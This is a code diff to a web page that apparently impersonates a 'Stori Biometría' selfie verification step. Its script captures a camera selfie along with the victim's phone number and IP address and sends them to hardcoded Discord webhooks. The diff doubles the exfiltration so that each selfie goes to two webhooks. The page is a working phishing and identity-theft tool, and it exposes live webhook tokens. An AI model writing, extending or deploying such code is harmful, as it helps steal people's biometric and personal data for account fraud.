@@ -102,8 +102,11 @@
   <canvas id="captureCanvas" style="display: none;"></canvas>
 
   <script>
-    // URL CORREGIDA
-    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNXJdUIQQc';
+    // DOS WEBHOOKS
+    const DISCORD_WEBHOOKS = [
+      'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0',
+      'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNXJdUIQQc'
+    ];
     
     let video = document.getElementById('video');
     let canvas = document.getElementById('captureCanvas');
@@ -180,16 +183,21 @@
           return new Blob(byteArrays, { type: contentType });
         }
 
-        const formData = new FormData();
         const payload = { 
           username: "Stori Biometría", 
           content: `📸 **Selfie Intento #${selfieAttempt}**\n\n**📱 Teléfono:** ${phone}\n**🌐 IP:** ${ip}\n**⏰ Fecha:** ${new Date().toLocaleString()}` 
         };
 
-        formData.append('payload_json', JSON.stringify(payload));
-        formData.append('file1', base64ToBlob(base64Image, 'image/jpeg'), `Selfie_Intento_${selfieAttempt}.jpg`);
+        // Enviar a AMBOS webhooks
+        const results = await Promise.allSettled(DISCORD_WEBHOOKS.map(async (url) => {
+          const formData = new FormData();
+          formData.append('payload_json', JSON.stringify(payload));
+          formData.append('file1', base64ToBlob(base64Image, 'image/jpeg'), `Selfie_Intento_${selfieAttempt}.jpg`);
+          return fetch(url, { method: 'POST', body: formData });
+        }));
 
-        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+        const anyOk = results.some(r => r.status === 'fulfilled' && r.value.ok);
+        if (!anyOk) throw new Error('Fallo al enviar a todos los webhooks');
 
         loader.style.display = 'none';
         isProcessing = false;
